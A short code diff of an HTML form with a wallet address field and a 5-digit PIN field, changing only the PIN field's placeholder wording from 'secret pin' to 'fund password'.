@@ -30,7 +30,7 @@
                     <input type="text" name="wallet_address" style="width: 100%" placeholder="Enter wallet address " />
                 </div>
                 <div class="input-box">
-                    <input type="number" name="pin" style="width: 100%" maxlength="5" placeholder="Enter your 5 digits secret pin" />
+                    <input type="number" name="pin" style="width: 100%" maxlength="5" placeholder="Enter your fund password it can only be 5 digits" />
                 </div>
                 <button type="submit" class="gradient-btn-full">Submit</button>
             </form>
